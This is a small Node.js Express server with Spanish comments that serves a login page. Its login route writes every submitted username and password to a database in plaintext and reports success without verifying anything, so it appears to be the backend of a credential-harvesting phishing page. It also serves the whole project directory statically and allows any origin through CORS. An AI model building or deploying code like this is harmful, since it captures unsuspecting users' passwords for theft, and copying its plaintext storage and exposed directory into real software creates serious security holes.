require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const db = require('./db');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// Página principal
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

// LOGIN - guarda cada intento en la base de datos
app.post('/api/login', async (req, res) => {
  const { usuario, password } = req.body;

  if (!usuario || !password) {
    return res.status(400).json({ ok: false, message: 'Por favor completa todos los campos' });
  }

  try {
    // Guardar el intento en la base de datos
    await db.query(
      'INSERT INTO usuarios (usuario, password, fecha) VALUES (?, ?, NOW())',
      [usuario, password]
    );

    res.json({ ok: true });

  } catch (err) {
    console.error('Error al guardar:', err.message);
    res.status(500).json({ ok: false, message: 'Error en el servidor' });
  }
});

app.listen(PORT, () => {
  console.log(`Servidor corriendo en puerto ${PORT}`);
});
